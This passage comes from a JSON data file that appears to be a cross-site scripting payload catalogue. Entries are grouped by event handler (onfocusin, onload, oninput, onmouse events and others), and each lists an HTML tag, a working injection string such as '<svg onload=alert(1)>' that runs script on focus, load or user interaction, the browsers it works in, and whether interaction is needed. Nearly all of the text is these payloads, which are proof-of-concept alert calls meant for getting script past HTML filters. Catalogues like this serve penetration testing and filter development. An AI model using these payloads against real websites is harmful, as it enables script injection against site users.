                        "code": "<figcaption id=x tabindex=1 onfocusin=alert(1)><\/figcaption>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "figure",
                        "code": "<figure id=x tabindex=1 onfocusin=alert(1)><\/figure>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "font",
                        "code": "<font id=x tabindex=1 onfocusin=alert(1)><\/font>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "footer",
                        "code": "<footer id=x tabindex=1 onfocusin=alert(1)><\/footer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "form",
                        "code": "<form id=x tabindex=1 onfocusin=alert(1)><\/form>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "frameset",
                        "code": "<frameset id=x tabindex=1 onfocusin=alert(1)><\/frameset>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x",
                        "context": "before_body"
                    },
                    {
                        "tag": "h1",
                        "code": "<h1 id=x tabindex=1 onfocusin=alert(1)><\/h1>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "head",
                        "code": "<head id=x tabindex=1 onfocusin=alert(1) style=display:block><\/head>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "header",
                        "code": "<header id=x tabindex=1 onfocusin=alert(1)><\/header>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "hgroup",
                        "code": "<hgroup id=x tabindex=1 onfocusin=alert(1)><\/hgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "hr",
                        "code": "<hr id=x tabindex=1 onfocusin=alert(1)><\/hr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "html",
                        "code": "<html id=x tabindex=1 onfocusin=alert(1)><\/html>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "i",
                        "code": "<i id=x tabindex=1 onfocusin=alert(1)><\/i>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "image",
                        "code": "<image id=x tabindex=1 onfocusin=alert(1)><\/image>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "img",
                        "code": "<img id=x tabindex=1 onfocusin=alert(1)><\/img>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ins",
                        "code": "<ins id=x tabindex=1 onfocusin=alert(1)><\/ins>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "kbd",
                        "code": "<kbd id=x tabindex=1 onfocusin=alert(1)><\/kbd>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "label",
                        "code": "<label id=x tabindex=1 onfocusin=alert(1)><\/label>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "legend",
                        "code": "<legend id=x tabindex=1 onfocusin=alert(1)><\/legend>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "li",
                        "code": "<li id=x tabindex=1 onfocusin=alert(1)><\/li>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "listing",
                        "code": "<listing id=x tabindex=1 onfocusin=alert(1)><\/listing>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "main",
                        "code": "<main id=x tabindex=1 onfocusin=alert(1)><\/main>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "map",
                        "code": "<map id=x tabindex=1 onfocusin=alert(1)><\/map>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "mark",
                        "code": "<mark id=x tabindex=1 onfocusin=alert(1)><\/mark>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "marquee",
                        "code": "<marquee id=x tabindex=1 onfocusin=alert(1)><\/marquee>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "menu",
                        "code": "<menu id=x tabindex=1 onfocusin=alert(1)><\/menu>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "menuitem",
                        "code": "<menuitem id=x tabindex=1 onfocusin=alert(1)><\/menuitem>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "meta",
                        "code": "<meta id=x tabindex=1 onfocusin=alert(1) style=display:block><\/meta>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "meter",
                        "code": "<meter id=x tabindex=1 onfocusin=alert(1)><\/meter>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "multicol",
                        "code": "<multicol id=x tabindex=1 onfocusin=alert(1)><\/multicol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "nav",
                        "code": "<nav id=x tabindex=1 onfocusin=alert(1)><\/nav>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "nextid",
                        "code": "<nextid id=x tabindex=1 onfocusin=alert(1)><\/nextid>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "nobr",
                        "code": "<nobr id=x tabindex=1 onfocusin=alert(1)><\/nobr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "noembed",
                        "code": "<noembed id=x tabindex=1 onfocusin=alert(1)><\/noembed>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "noframes",
                        "code": "<noframes id=x tabindex=1 onfocusin=alert(1)><\/noframes>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "noscript",
                        "code": "<noscript id=x tabindex=1 onfocusin=alert(1)><\/noscript>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ol",
                        "code": "<ol id=x tabindex=1 onfocusin=alert(1)><\/ol>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "optgroup",
                        "code": "<optgroup id=x tabindex=1 onfocusin=alert(1)><\/optgroup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "option",
                        "code": "<option id=x tabindex=1 onfocusin=alert(1)><\/option>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "output",
                        "code": "<output id=x tabindex=1 onfocusin=alert(1)><\/output>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "p",
                        "code": "<p id=x tabindex=1 onfocusin=alert(1)><\/p>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "param",
                        "code": "<param id=x tabindex=1 onfocusin=alert(1)><\/param>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "picture",
                        "code": "<picture id=x tabindex=1 onfocusin=alert(1)><\/picture>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "plaintext",
                        "code": "<plaintext id=x tabindex=1 onfocusin=alert(1)><\/plaintext>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "pre",
                        "code": "<pre id=x tabindex=1 onfocusin=alert(1)><\/pre>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "progress",
                        "code": "<progress id=x tabindex=1 onfocusin=alert(1)><\/progress>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "q",
                        "code": "<q id=x tabindex=1 onfocusin=alert(1)><\/q>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rb",
                        "code": "<rb id=x tabindex=1 onfocusin=alert(1)><\/rb>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rp",
                        "code": "<rp id=x tabindex=1 onfocusin=alert(1)><\/rp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rt",
                        "code": "<rt id=x tabindex=1 onfocusin=alert(1)><\/rt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "rtc",
                        "code": "<rtc id=x tabindex=1 onfocusin=alert(1)><\/rtc>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ruby",
                        "code": "<ruby id=x tabindex=1 onfocusin=alert(1)><\/ruby>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "s",
                        "code": "<s id=x tabindex=1 onfocusin=alert(1)><\/s>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "samp",
                        "code": "<samp id=x tabindex=1 onfocusin=alert(1)><\/samp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "script",
                        "code": "<script id=x tabindex=1 onfocusin=alert(1)><\/script>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "section",
                        "code": "<section id=x tabindex=1 onfocusin=alert(1)><\/section>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "shadow",
                        "code": "<shadow id=x tabindex=1 onfocusin=alert(1)><\/shadow>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "slot",
                        "code": "<slot id=x tabindex=1 onfocusin=alert(1)><\/slot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "small",
                        "code": "<small id=x tabindex=1 onfocusin=alert(1)><\/small>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "source",
                        "code": "<source id=x tabindex=1 onfocusin=alert(1)><\/source>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "spacer",
                        "code": "<spacer id=x tabindex=1 onfocusin=alert(1)><\/spacer>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "span",
                        "code": "<span id=x tabindex=1 onfocusin=alert(1)><\/span>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "strike",
                        "code": "<strike id=x tabindex=1 onfocusin=alert(1)><\/strike>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "strong",
                        "code": "<strong id=x tabindex=1 onfocusin=alert(1)><\/strong>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "style",
                        "code": "<style id=x tabindex=1 onfocusin=alert(1) style=display:block><\/style>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "sub",
                        "code": "<sub id=x tabindex=1 onfocusin=alert(1)><\/sub>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "summary",
                        "code": "<summary id=x tabindex=1 onfocusin=alert(1)><\/summary>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "sup",
                        "code": "<sup id=x tabindex=1 onfocusin=alert(1)><\/sup>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "table",
                        "code": "<table id=x tabindex=1 onfocusin=alert(1)><\/table>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tbody",
                        "code": "<tbody id=x tabindex=1 onfocusin=alert(1)><\/tbody>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "td",
                        "code": "<td id=x tabindex=1 onfocusin=alert(1)><\/td>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "template",
                        "code": "<template id=x tabindex=1 onfocusin=alert(1)><\/template>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tfoot",
                        "code": "<tfoot id=x tabindex=1 onfocusin=alert(1)><\/tfoot>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "th",
                        "code": "<th id=x tabindex=1 onfocusin=alert(1)><\/th>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "thead",
                        "code": "<thead id=x tabindex=1 onfocusin=alert(1)><\/thead>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "time",
                        "code": "<time id=x tabindex=1 onfocusin=alert(1)><\/time>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "title",
                        "code": "<title id=x tabindex=1 onfocusin=alert(1)><\/title>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tr",
                        "code": "<tr id=x tabindex=1 onfocusin=alert(1)><\/tr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "track",
                        "code": "<track id=x tabindex=1 onfocusin=alert(1)><\/track>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "tt",
                        "code": "<tt id=x tabindex=1 onfocusin=alert(1)><\/tt>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "u",
                        "code": "<u id=x tabindex=1 onfocusin=alert(1)><\/u>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "ul",
                        "code": "<ul id=x tabindex=1 onfocusin=alert(1)><\/ul>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "var",
                        "code": "<var id=x tabindex=1 onfocusin=alert(1)><\/var>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "wbr",
                        "code": "<wbr id=x tabindex=1 onfocusin=alert(1)><\/wbr>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "xmp",
                        "code": "<xmp id=x tabindex=1 onfocusin=alert(1)><\/xmp>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    },
                    {
                        "tag": "custom tags",
                        "code": "<xss autofocus tabindex=1 onfocusin=alert(1)><\/xss>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "hash": "#x"
                    }
                ]
            },
            "onfocusout": {
                "description": "Fires when an element loses focus",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onfocusout=alert(1) autofocus tabindex=1 style=display:block>test<\/*><input value=clickme>",
                        "browsers": [
                            "chrome",
                            "safari",
                            "firefox"
                        ],
                        "interaction": true,
                        "hash": "#x"
                    }
                ]
            },
            "onformdata": {
                "description": "Triggered when a form is submitted",
                "tags": [
                    {
                        "tag": "form",
                        "code": "<form onformdata=\"alert(1)\"><button>Click<\/button><\/form>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onfullscreenchange": {
                "description": "Fires when a video changes full screen status",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video onfullscreenchange=alert(1) src=validvideo.mp4 controls>",
                        "browsers": [
                            "firefox"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onhashchange": {
                "description": "Fires if the hash changes",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onhashchange=\"print()\">",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "oninput": {
                "description": "Requires as change of value",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<input oninput=alert(1) value=xss>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "code": "<textarea oninput=alert(1)>XSS<\/textarea>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "oninvalid": {
                "description": "Requires a form submission with an element that does not satisfy its constraints such as a required attribute.",
                "tags": [
                    {
                        "tag": "input",
                        "code": "<form><input oninvalid=alert(1) required><input type=submit>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    },
                    {
                        "tag": "textarea",
                        "code": "<form><textarea oninvalid=alert(1) required><input type=submit>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onkeydown": {
                "description": "Triggered when a key is pressed",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onkeydown=\"alert(1)\" contenteditable style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onkeypress": {
                "description": "Triggered when a key is pressed",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onkeypress=\"alert(1)\" contenteditable style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onkeyup": {
                "description": "Triggered when a key is released",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onkeyup=\"alert(1)\" contenteditable style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onload": {
                "description": "Fires when the element is loaded",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "script",
                        "code": "<script onload=alert(1) src=validjs.js><\/script>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "object",
                        "code": "<object data=\/ onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "style",
                        "code": "<style onload=alert(1)><\/style>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "svg",
                        "code": "<svg onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "link",
                        "code": "<link href=validstyles.css rel=stylesheet onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "iframe",
                        "code": "<iframe onload=alert(1)><\/iframe>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "frame",
                        "code": "<frameset><frame onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false,
                        "context": "before_body"
                    },
                    {
                        "tag": "embed",
                        "code": "<embed src=\/ onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "img",
                        "code": "<img src=validimage.png onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "img2",
                        "code": "<picture><source srcset=\"validimage.png\"><img onload=alert(1)><\/picture>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "img2",
                        "code": "<img srcset=validimage.png onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "image",
                        "code": "<image src=validimage.png onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "image2",
                        "code": "<picture><source srcset=\"validimage.png\"><image onload=alert(1)><\/picture>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "image3",
                        "code": "<svg><image href=validimage.png onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "input",
                        "code": "<input type=image src=validimage.png onload=alert(1)>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "track",
                        "code": "<video><track default onload=alert(1) src=\"data:text\/vtt,WEBVTT\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onloadeddata": {
                "description": "Fires when the first frame is loaded",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video onloadeddata=alert(1)><source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio onloadeddata=alert(1)><source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onloadedmetadata": {
                "description": "Fires when the meta data is loaded",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video autoplay onloadedmetadata=alert(1)> <source src=\"validvideo.mp4\" type=\"video\/mp4\"><\/video>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    },
                    {
                        "tag": "audio",
                        "code": "<audio autoplay onloadedmetadata=alert(1)> <source src=\"validaudio.wav\" type=\"audio\/wav\"><\/audio>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onloadstart": {
                "description": "Triggered video is loaded",
                "tags": [
                    {
                        "tag": "video",
                        "code": "<video onloadstart=\"alert(1)\"><source><\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onmessage": {
                "description": "Fires when message event is received from a postMessage call",
                "tags": [
                    {
                        "tag": "body",
                        "code": "<body onmessage=print()>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": false
                    }
                ]
            },
            "onmousedown": {
                "description": "Triggered when the mouse is pressed",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmousedown=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onmouseenter": {
                "description": "Triggered when the mouse is hovered over the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmouseenter=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onmouseleave": {
                "description": "Triggered when the mouse is moved away from the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmouseleave=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onmousemove": {
                "description": "Requires mouse movement",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmousemove=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onmouseout": {
                "description": "Triggered when the mouse is moved away from the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmouseout=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onmouseover": {
                "description": "Requires a hover over the element",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmouseover=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onmouseup": {
                "description": "Triggered when the mouse button is released",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmouseup=\"alert(1)\" style=display:block>test<\/*>",
                        "browsers": [
                            "chrome",
                            "firefox",
                            "safari"
                        ],
                        "interaction": true
                    }
                ]
            },
            "onmousewheel": {
                "description": "Fires when the mousewheel scrolls",
                "tags": [
                    {
                        "tag": "*",
                        "code": "<* onmousewheel=alert(1) style=display:block>requires scrolling",
                        "browsers": [
                            "chrome"
                        ],
